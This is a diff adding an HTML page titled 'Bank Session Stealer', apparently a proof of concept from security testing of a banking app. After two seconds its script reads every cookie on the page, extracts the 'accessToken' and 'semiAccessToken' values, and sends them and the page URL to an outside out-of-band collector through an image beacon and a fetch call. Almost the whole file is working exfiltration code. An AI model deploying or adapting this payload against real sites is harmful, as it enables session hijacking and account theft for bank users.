@@ -1,0 +1,38 @@
+<!-- Save as steal_cookies.html and host on any HTTPS server -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bank Session Stealer</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // Wait for cookies to be set by the app
+        setTimeout(function() {
+            // Steal all cookies
+            var stolenCookies = document.cookie;
+            
+            // Extract access tokens specifically
+            var accessToken = document.cookie.match(/accessToken=([^;]+)/);
+            var semiToken = document.cookie.match(/semiAccessToken=([^;]+)/);
+            
+            // Send to attacker server
+            var webhookUrl = "https://ridyigyxdklayshdjyvaztbtz6dfz6nln.oast.fun/steal?" + 
+                             "cookies=" + encodeURIComponent(stolenCookies) +
+                             "&accessToken=" + (accessToken ? accessToken[1] : 'none') +
+                             "&semiToken=" + (semiToken ? semiToken[1] : 'none') +
+                             "&url=" + encodeURIComponent(window.location.href);
+            
+            // Method 1: Image beacon (no CORS issues)
+            var img = new Image();
+            img.src = webhookUrl;
+            
+            // Method 2: Also try fetch with no-cors
+            fetch(webhookUrl, { mode: 'no-cors' });
+            
+            // Display stolen data for debugging
+            document.body.innerHTML = '<h2>Cookies Stolen!</h2><pre>' + stolenCookies + '</pre>';
+        }, 2000); // Wait 2 seconds for cookie injection
+    </script>
+</body>
+</html>
